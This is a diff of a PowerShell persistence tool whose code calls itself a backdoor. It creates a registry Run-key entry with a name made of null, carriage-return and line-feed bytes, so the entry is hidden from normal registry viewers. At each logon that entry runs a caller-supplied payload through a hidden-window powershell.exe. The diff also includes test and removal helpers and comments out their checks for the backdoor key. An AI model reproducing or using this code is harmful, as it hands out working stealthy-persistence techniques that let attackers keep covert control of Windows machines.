@@ -17,7 +17,7 @@ function Add-PersistNullRegkey{
     
         [CmdletBinding()]
             Param(
-            [Parameter(Mandatory=$True)]
+            [Parameter(Mandatory)]
             [string]$Payload
         )
         [Byte[]]$malformed_ary = 0x00,0x0a,0x0d #`0`r`n
@@ -27,7 +27,7 @@ function Add-PersistNullRegkey{
         # New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "$powershell_path -windowstyle hidden -c `"`$val = (gp HKLM:SOFTWARE\`'$malformed_string`').`'$malformed_string`'; $powershell_path -windowstyle hidden -ec `$val`""
         
         # Streamlined single instance powershell method
-        New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "powershell.exe -windowstyle hidden -c `"$Payload`""
+        New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $malformed_string -PropertyType String -value "powershell.exe -windowstyle hidden -c {$Payload}"
 } 
     
     
@@ -40,11 +40,13 @@ function Test-PersistNullRegkey{
         [Byte[]]$malformed_ary = 0x00,0x0a,0x0d #`0`r`n
         $malformed_string = [System.text.encoding]::Unicode.GetString($malformed_ary)
     
+        <#
         if (Test-Path "HKLM:\SOFTWARE\$malformed_string") {
             Write-Output "[*] Backdoor exists"
         } else {
             Write-Output "[!] No backdoor present"
         }
+        #>
         if (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run "$malformed_string") {
             Write-Output "[*] Launcher exists"
         } else {
@@ -59,13 +61,15 @@ function Remove-PersistNullRegkey{
     #>
         [Byte[]]$malformed_ary = 0x00,0x0a,0x0d #`0`r`n
         $malformed_string = [System.text.encoding]::Unicode.GetString($malformed_ary)
+        <#
         if (Test-Path "HKLM:\SOFTWARE\$malformed_string") {
             Remove-Item -Path "HKLM:\SOFTWARE\$malformed_string"
             Write-Output "[*] Backdoor Removed"
         } else {
             Write-Output "[!] Error Removing Backdoor (already removed?)"
         }
-    
+        #>
+
         if (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run "$malformed_string") {
             Remove-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -Name "$malformed_string"
             Write-Output "[*] Launcher Removed"
